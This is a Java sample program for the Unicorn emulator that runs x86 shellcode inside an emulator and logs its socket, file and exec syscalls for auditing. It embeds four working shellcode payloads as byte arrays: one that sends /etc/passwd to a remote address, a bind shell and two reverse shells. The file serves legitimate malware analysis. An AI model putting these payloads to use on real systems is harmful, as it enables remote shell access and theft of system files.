/*

Java bindings for the Unicorn Emulator Engine

Copyright(c) 2015 Chris Eagle

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
version 2 as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

*/

/*
  Unicorn sample for auditing network connection and file handling in shellcode.
  Nguyen Tan Cong <shenlongbk@gmail.com>
*/

import unicorn.*;
import java.util.*;


public class SampleNetworkAuditing {

   public static int next_id = 3;
   public static final int SIZE_REG = 4;

   private static LogChain fd_chains = new LogChain();

   public static int get_id() {
      return next_id++;
   }

   public static final long toInt(byte val[]) {
      long res = 0;
      for (int i = 0; i < val.length; i++) {
         long v = val[i] & 0xff;
         res = res + (v << (i * 8));
      }
      return res;
   }

   public static final byte[] toBytes(long val) {
      byte[] res = new byte[8];
      for (int i = 0; i < 8; i++) {
         res[i] = (byte)(val & 0xff);
         val >>>= 8;
      }
      return res;
   }


   private static class MyInterruptHook implements InterruptHook {
      // callback for tracing Linux interrupt
      public void hook(Unicorn uc, int intno, Object user) {
//         System.err.println(String.format("Interrupt 0x%x, from Unicorn 0x%x", intno, u.hashCode()));

         // only handle Linux syscall
         if (intno != 0x80) {
            return;
         }
         long eax = toInt(uc.reg_read(Unicorn.UC_X86_REG_EAX, 4));
         long ebx = toInt(uc.reg_read(Unicorn.UC_X86_REG_EBX, 4));
         long ecx = toInt(uc.reg_read(Unicorn.UC_X86_REG_ECX, 4));
         long edx = toInt(uc.reg_read(Unicorn.UC_X86_REG_EDX, 4));
         long eip = toInt(uc.reg_read(Unicorn.UC_X86_REG_EIP, 4));

          // System.out.printf(">>> INTERRUPT %d\n", toInt(eax));
   
         if (eax == 1) {    // sys_exit
            System.out.printf(">>> SYS_EXIT\n");
            uc.emu_stop();
         }
         else if (eax == 3) { // sys_read
            long fd = ebx;
            long buf = ecx;
            long count = edx;
            
            String uuid = UUID.randomUUID().toString().substring(0, 32);
            
            byte[] dummy_content = Arrays.copyOfRange(uuid.getBytes(), 0, (int)Math.min(count, uuid.length()));
            uc.mem_write(buf, dummy_content);
            
            String msg = String.format("read %d bytes from fd(%d) with dummy_content(%s)", count, fd, uuid.substring(0, dummy_content.length));
            
            fd_chains.add_log(fd, msg);
            System.out.printf(">>> %s\n", msg);
         }
         else if (eax == 4) { // sys_write
            long fd = ebx;
            long buf = ecx;
            long count = edx;
   
            byte[] content = uc.mem_read(buf, count);
   
            String msg = String.format("write data=%s count=%d to fd(%d)", new String(content), count, fd);
   
            System.out.printf(">>> %s\n", msg);
            fd_chains.add_log(fd, msg);
         }
         else if (eax == 5) { // sys_open
            long filename_addr = ebx;
            long flags = ecx;
            long mode = edx;
            String filename = read_string(uc, filename_addr);
            
            int dummy_fd = get_id();
            uc.reg_write(Unicorn.UC_X86_REG_EAX, toBytes(dummy_fd));
            
            String msg = String.format("open file (filename=%s flags=%d mode=%d) with fd(%d)", filename, flags, mode, dummy_fd);
            
            fd_chains.create_chain(dummy_fd);
            fd_chains.add_log(dummy_fd, msg);
            System.out.printf(">>> %s\n", msg);
         }
         else if (eax == 11) { // sys_execv
            // System.out.printf(">>> ebx=0x%x, ecx=0x%x, edx=0x%x\n", ebx, ecx, edx));
            String filename = read_string(uc, ebx);
            
            System.out.printf(">>> SYS_EXECV filename=%s\n", filename);
         }
         else if (eax == 63) { // sys_dup2
            fd_chains.link_fd(ecx, ebx);
            System.out.printf(">>> SYS_DUP2 oldfd=%d newfd=%d\n", ebx, ecx);
         }
         else if (eax == 102) { // sys_socketcall
            // ref: http://www.skyfree.org/linux/kernel_network/socket.html
            long call = toInt(uc.reg_read(Unicorn.UC_X86_REG_EBX, 4));
            long args = toInt(uc.reg_read(Unicorn.UC_X86_REG_ECX, 4));
            
            // int sys_socketcall(int call, unsigned long *args)
            if (call == 1) { // sys_socket
               // err = sys_socket(a0,a1,a[2])
               // int sys_socket(int family, int type, int protocol)
               long family = toInt(uc.mem_read(args, SIZE_REG));
               long sock_type = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long protocol = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               
               int dummy_fd = get_id();
               uc.reg_write(Unicorn.UC_X86_REG_EAX, toBytes(dummy_fd));
               
               if (family == 2) {  // AF_INET            
                  String msg = String.format("create socket (%s, %s) with fd(%d)", ADDR_FAMILY.get(family), SOCKET_TYPES.get(sock_type), dummy_fd);
                  fd_chains.create_chain(dummy_fd);
                  fd_chains.add_log(dummy_fd, msg);
                  print_sockcall(msg);
               }
               else if (family == 3) { // AF_INET6
               }
            }
            else if (call == 2) { // sys_bind
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long umyaddr = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long addrlen = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               
               byte[] sock_addr = uc.mem_read(umyaddr, addrlen);
               
               String msg = String.format("fd(%d) bind to %s", fd, parse_sock_address(sock_addr));
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }
            else if (call == 3) { // sys_connect
               // err = sys_connect(a0, (struct sockaddr *)a1, a[2])
               // int sys_connect(int fd, struct sockaddr *uservaddr, int addrlen)
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long uservaddr = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long addrlen = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               
               byte[] sock_addr = uc.mem_read(uservaddr, addrlen);
               String msg = String.format("fd(%d) connect to %s", fd, parse_sock_address(sock_addr));
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }
            else if (call == 4) { // sys_listen
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long backlog = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               
               String msg = String.format("fd(%d) listened with backlog=%d", fd, backlog);
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }
            else if (call == 5) { // sys_accept
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long upeer_sockaddr = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long upeer_addrlen = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               
               // System.out.printf(">>> upeer_sockaddr=0x%x, upeer_addrlen=%d\n" % (upeer_sockaddr, upeer_addrlen))
               
               if (upeer_sockaddr == 0x0) {
                  print_sockcall(String.format("fd(%d) accept client", fd));
               }
               else {
                  long upeer_len = toInt(uc.mem_read(upeer_addrlen, 4));
                  
                  byte[] sock_addr = uc.mem_read(upeer_sockaddr, upeer_len);
                  
                  String msg = String.format("fd(%d) accept client with upeer=%s", fd, parse_sock_address(sock_addr));
                  fd_chains.add_log(fd, msg);
                  print_sockcall(msg);
               }
            }
            else if (call == 9) { // sys_send
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long buff = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long length = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               long flags = toInt(uc.mem_read(args + SIZE_REG * 3, SIZE_REG));
               
               byte[] buf = uc.mem_read(buff, length);
               String msg = String.format("fd(%d) send data=%s", fd, new String(buf));
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }
            else if (call == 11) { // sys_receive
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long ubuf = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               long size = toInt(uc.mem_read(args + SIZE_REG * 2, SIZE_REG));
               long flags = toInt(uc.mem_read(args + SIZE_REG * 3, SIZE_REG));
               
               String msg = String.format("fd(%d) is gonna receive data with size=%d flags=%d", fd, size, flags);
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }
            else if (call == 13) { // sys_shutdown
               long fd = toInt(uc.mem_read(args, SIZE_REG));
               long how = toInt(uc.mem_read(args + SIZE_REG, SIZE_REG));
               
               String msg = String.format("fd(%d) is shutted down because of %d", fd, how);
               fd_chains.add_log(fd, msg);
               print_sockcall(msg);
            }      
         }
      }
   }
      
   public static final Hashtable<Long, String> SOCKET_TYPES;
   public static final Hashtable<Long, String> ADDR_FAMILY;
   static {
      SOCKET_TYPES = new Hashtable<Long, String>();
      ADDR_FAMILY = new Hashtable<Long, String>();
      SOCKET_TYPES.put(1L, "SOCK_STREAM");
      SOCKET_TYPES.put(2L, "SOCK_DGRAM");
      SOCKET_TYPES.put(3L, "SOCK_RAW");
      SOCKET_TYPES.put(4L, "SOCK_RDM");
      SOCKET_TYPES.put(5L, "SOCK_SEQPACKET");
      SOCKET_TYPES.put(10L, "SOCK_PACKET");
   
      ADDR_FAMILY.put(0L, "AF_UNSPEC");
      ADDR_FAMILY.put(1L, "AF_UNIX");
      ADDR_FAMILY.put(2L, "AF_INET");
      ADDR_FAMILY.put(3L, "AF_AX25");
      ADDR_FAMILY.put(4L, "AF_IPX");
      ADDR_FAMILY.put(5L, "AF_APPLETALK");
      ADDR_FAMILY.put(6L, "AF_NETROM");
      ADDR_FAMILY.put(7L, "AF_BRIDGE");
      ADDR_FAMILY.put(8L, "AF_AAL5");
      ADDR_FAMILY.put(9L, "AF_X25");
      ADDR_FAMILY.put(10L, "AF_INET6");
      ADDR_FAMILY.put(12L, "AF_MAX");
   }

// http://shell-storm.org/shellcode/files/shellcode-861.php
   public static final byte[] X86_SEND_ETCPASSWD = {106,102,88,49,-37,67,49,-46,82,106,1,106,2,-119,-31,-51,-128,-119,-58,106,102,88,67,104,127,1,1,1,102,104,48,57,102,83,-119,-31,106,16,81,86,-119,-31,67,-51,-128,-119,-58,106,1,89,-80,63,-51,-128,-21,39,106,5,88,91,49,-55,-51,-128,-119,-61,-80,3,-119,-25,-119,-7,49,-46,-74,-1,-78,-1,-51,-128,-119,-62,106,4,88,-77,1,-51,-128,106,1,88,67,-51,-128,-24,-44,-1,-1,-1,47,101,116,99,47,112,97,115,115,119,100};
// http://shell-storm.org/shellcode/files/shellcode-882.php
   public static final byte[] X86_BIND_TCP = {106,102,88,106,1,91,49,-10,86,83,106,2,-119,-31,-51,-128,95,-105,-109,-80,102,86,102,104,5,57,102,83,-119,-31,106,16,81,87,-119,-31,-51,-128,-80,102,-77,4,86,87,-119,-31,-51,-128,-80,102,67,86,86,87,-119,-31,-51,-128,89,89,-79,2,-109,-80,63,-51,-128,73,121,-7,-80,11,104,47,47,115,104,104,47,98,105,110,-119,-29,65,-119,-54,-51,-128};
// http://shell-storm.org/shellcode/files/shellcode-883.php
   public static final byte[] X86_REVERSE_TCP = {106,102,88,106,1,91,49,-46,82,83,106,2,-119,-31,-51,-128,-110,-80,102,104,127,1,1,1,102,104,5,57,67,102,83,-119,-31,106,16,81,82,-119,-31,67,-51,-128,106,2,89,-121,-38,-80,63,-51,-128,73,121,-7,-80,11,65,-119,-54,82,104,47,47,115,104,104,47,98,105,110,-119,-29,-51,-128};
// http://shell-storm.org/shellcode/files/shellcode-849.php
   public static final byte[] X86_REVERSE_TCP_2 = {49,-64,49,-37,49,-55,49,-46,-80,102,-77,1,81,106,6,106,1,106,2,-119,-31,-51,-128,-119,-58,-80,102,49,-37,-77,2,104,-64,-88,1,10,102,104,122,105,102,83,-2,-61,-119,-31,106,16,81,86,-119,-31,-51,-128,49,-55,-79,3,-2,-55,-80,63,-51,-128,117,-8,49,-64,82,104,110,47,115,104,104,47,47,98,105,-119,-29,82,83,-119,-31,82,-119,-30,-80,11,-51,-128};

   // memory address where emulation starts
   public static final int ADDRESS = 0x1000000;

   public static String join(ArrayList<String> l, String sep) {
      boolean first = true;
      StringBuilder res = new StringBuilder();
      for (String s : l) {
         if (!first) {
            res.append(sep);
         }
         res.append(s);
         first = false;
      }
      return res.toString();
   }

   private static class LogChain {
      public Hashtable<Long, ArrayList<String>> __chains = new Hashtable<Long, ArrayList<String>>();
      public Hashtable<Long, ArrayList<Long>> __linking_fds = new Hashtable<Long, ArrayList<Long>>();

      public void clean() {
         __chains.clear();
         __linking_fds.clear();
      }

      public void create_chain(long id) {
         if (!__chains.containsKey(id)) {
            __chains.put(id, new ArrayList<String>());
         }
         else {
            System.out.printf("LogChain: id %d existed\n", id);
         }
      }

      public void add_log(long id, String msg) {
         long fd = get_original_fd(id);
         
         if (fd != -1) {
            __chains.get(fd).add(msg);
         }
         else {
            System.out.printf("LogChain: id %d doesn't exist\n", id);
         }
      }

      public void link_fd(long from_fd, long to_fd) {
         if (!__linking_fds.containsKey(to_fd)) {
            __linking_fds.put(to_fd, new ArrayList<Long>());
         }
         
         __linking_fds.get(to_fd).add(from_fd);
      }
       
      public long get_original_fd(long fd) {
         if (__chains.containsKey(fd)) {
            return fd;
         }
         
         for (Long orig_fd : __linking_fds.keySet()) {
            if (__linking_fds.get(orig_fd).contains(fd))
               return orig_fd;
         }
         return -1;
      }

      public void print_report() {
         System.out.printf("\n----------------");
         System.out.printf("\n| START REPORT |");
         System.out.printf("\n----------------\n\n");
         for (Long fd : __chains.keySet()) {
            System.out.printf("---- START FD(%d) ----\n", fd);
            System.out.println(join(__chains.get(fd), "\n"));
            System.out.printf("---- END FD(%d) ----\n", fd);
         }
         System.out.printf("\n--------------");
         System.out.printf("\n| END REPORT |");
         System.out.printf("\n--------------\n\n");
      }
   }
   // end supported classes

   // utilities
   static String read_string(Unicorn uc, long addr) {
      StringBuilder ret = new StringBuilder();
      char c;
      do {
         c = (char)(uc.mem_read(addr++, 1)[0] & 0xff);
         if (c != 0) {
            ret.append(c);
         }
      } while (c != 0);
      
      return ret.toString();
   }

   static String parse_sock_address(byte[] sock_addr) {
      int sin_family = ((sock_addr[0] & 0xff) + (sock_addr[1] << 8)) & 0xffff;
      
      if (sin_family == 2) { // AF_INET
         int sin_port = ((sock_addr[3] & 0xff) + (sock_addr[2] << 8)) & 0xffff;
         return String.format("%d.%d.%d.%d:%d", sock_addr[4] & 0xff, sock_addr[5] & 0xff, sock_addr[6] & 0xff, sock_addr[7] & 0xff, sin_port);
      }
      else if (sin_family == 6) // AF_INET6
         return "";
      return null;
   }

   static void print_sockcall(String msg) {
      System.out.printf(">>> SOCKCALL %s\n", msg);
   }
   // end utilities

   static void test_i386(byte[] code) {
      fd_chains.clean();
      System.out.printf("Emulate i386 code\n");
      try {
         // Initialize emulator in X86-32bit mode
         Unicorn mu = new Unicorn(Unicorn.UC_ARCH_X86, Unicorn.UC_MODE_32);
         
         // map 2MB memory for this emulation
         mu.mem_map(ADDRESS, 2 * 1024 * 1024, Unicorn.UC_PROT_ALL);
         
         // write machine code to be emulated to memory
         mu.mem_write(ADDRESS, code);
         
         // initialize stack
         mu.reg_write(Unicorn.UC_X86_REG_ESP, toBytes(ADDRESS + 0x200000));
         
         // handle interrupt ourself
         mu.hook_add(new MyInterruptHook(), null);
         
         // emulate machine code in infinite time
         mu.emu_start(ADDRESS, ADDRESS + code.length, 0, 0);
         
         // now print out some registers
         System.out.printf(">>> Emulation done\n");

      } catch (UnicornException uex) {
         System.out.printf("ERROR: %s\n", uex.getMessage());
      }

      fd_chains.print_report();
   }
   
   public static void main(String args[]) {
      test_i386(X86_SEND_ETCPASSWD);
      test_i386(X86_BIND_TCP);
      test_i386(X86_REVERSE_TCP);
      test_i386(X86_REVERSE_TCP_2);
   }

}
